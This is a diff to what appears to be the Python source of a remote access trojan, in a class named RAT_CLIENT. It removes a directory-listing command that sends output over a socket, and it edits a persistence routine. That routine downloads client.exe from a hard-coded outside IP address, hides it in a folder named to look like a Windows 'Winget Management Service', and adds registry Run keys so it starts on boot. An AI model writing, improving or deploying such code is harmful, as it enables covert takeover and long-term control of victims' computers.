@@ -484,14 +484,6 @@ class RAT_CLIENT:
                 except:
                     self.errorsend()
 
-            elif command == 'ls':
-                try:
-                    output = subprocess.check_output(["dir"], shell=True)
-                    output = output.decode('utf8', errors='ignore')
-                    s.send(output.encode())
-                except:
-                    self.errorsend()
-
             elif command[1:2] == ':':
                 try:
                     os.chdir(command)
@@ -662,9 +654,9 @@ def persist():
             os.chdir('Winget Management Service')
             response = requests.get('http://50.116.8.102/client.exe')
             open('client.exe', 'wb').write(response.content)
-            command = f'REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ManagerAsset /t REG_SZ /d "{os.environ["APPDATA"]}/Winget Management Service/client.exe"'
+            command = f'REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ManagerAsset /t REG_SZ /d "{os.environ["APPDATA"]}\\Winget Management Service\\client.exe"'
             os.system(command)
-            os.system(f'REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ManagerAsset /t REG_SZ /d "{os.environ["APPDATA"]}/Winget Management Service/client.exe"')
+            os.system(f'REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ManagerAsset /t REG_SZ /d "{os.environ["APPDATA"]}\\Winget Management Service\\client.exe"')
 
         except FileExistsError:
             os.chdir('Winget Management Service')
